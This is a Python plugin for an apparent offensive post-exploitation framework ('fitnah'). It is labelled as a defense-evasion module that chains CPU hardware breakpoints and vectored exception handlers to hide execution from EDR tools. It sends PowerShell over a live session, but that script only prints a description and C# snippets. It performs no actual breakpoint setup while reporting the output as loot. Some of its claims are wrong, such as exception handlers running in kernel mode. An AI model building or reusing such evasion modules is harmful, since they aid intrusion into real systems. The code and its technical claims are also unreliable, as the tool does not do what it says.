"""defense_evasion/hardware_breakpoints — Hardware breakpoint chaining for execution hiding. MITRE T1055"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class HardwareBreakpoints(BasePlugin):
    NAME = "hardware_breakpoints"
    DESCRIPTION = "Hardware breakpoint chaining for invisible code execution via CPU debug registers"
    AUTHOR = "fitnah-team"
    MITRE = "T1055"
    CATEGORY = "defense_evasion"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("num_breakpoints", int, required=False, default=4,
              help="Number of breakpoints to chain (max 4: DR0-DR3)"),
        Param("target_address", str, required=False, default="",
              help="Target address to reach after breakpoint chain"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute hardware breakpoint chaining"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        num_breakpoints = params.get("num_breakpoints", 4)
        target_address = params.get("target_address", "")

        return self._setup_bp_chain(ctx, num_breakpoints, target_address)

    @staticmethod
    def _setup_bp_chain(ctx, num_bp: int, target: str) -> ModuleResult:
        """Setup hardware breakpoint chain"""
        ps_code = f"""
$results = @()
$results += '[*] Hardware Breakpoint Chaining attack...'

try {{
    $numBP = {num_bp}
    if ($numBP -lt 1 -or $numBP -gt 4) {{
        $results += '[-] Breakpoints must be 1-4 (DR0-DR3)'
        $results -join "`n"
        exit
    }}

    $results += "[*] Setting up $numBP breakpoint chain"

    $results += '[*] Hardware Breakpoint mechanism:'
    $results += '    - CPU provides 4 debug registers (DR0-DR3)'
    $results += '    - DR7: Control register (enables BPs, types, etc)'
    $results += '    - DR6: Status register (which BP was hit)'
    $results += '    - When address accessed → CPU exception'
    $results += '    - Handler runs in kernel mode'

    $results += '[*] Chaining strategy:'
    $results += '    1. Set DR0 = address of first sensitive function'
    $results += '    2. Register VEH (Vectored Exception Handler)'
    $results += '    3. When DR0 hits → exception handler runs'
    $results += '    4. Handler does work, then sets DR1'
    $results += '    5. Continue chain through DR2, DR3'
    $results += '    6. Final BP calls target function'

    $results += '[*] Implementation (inline C#):'
    $results += '    [DllImport("kernel32")]'
    $results += '    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);'
    $results += '    '
    $results += '    // Set DR0'
    $results += '    ctx.Dr0 = (ulong)address1;'
    $results += '    ctx.Dr7 = 0x00000001;  // Enable DR0'
    $results += '    SetThreadContext(hThread, ref ctx);'
    $results += '    '
    $results += '    // Register VEH'
    $results += '    IntPtr veh = AddVectoredExceptionHandler('
    $results += '        1, new PVECTORED_EXCEPTION_HANDLER(ExceptionHandler)'
    $results += '    );'
    $results += '    '
    $results += '    // Trigger BP → handler sets next DR'

    $results += '[*] Execution flow:'
    $results += '    Access address1 → CPU exception'
    $results += '    → VEH handler → set DR1'
    $results += '    Return from handler → execution continues'
    $results += '    Access address2 → CPU exception'
    $results += '    → VEH handler → set DR2'
    $results += '    ... continue ...'
    $results += '    Last BP triggers target function'

    $results += '[*] EDR bypass benefit:'
    $results += '    ✓ Execution is CPU-driven (not hooked)'
    $results += '    ✓ Exception handlers bypass user-mode hooks'
    $results += '    ✓ Very hard to detect in real-time'
    $results += '    ✓ Limited visibility into BP activity'

    $results += '[!] Limitations:'
    $results += '    - Only 4 BPs available'
    $results += '    - Each BP is execution-on-hit (not silent)'
    $results += '    - VEH can be detected/unregistered'
    $results += '    - More visible than direct syscall'

}} catch {{
    $results += "[!] Hardware BP error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="hardware_breakpoints")
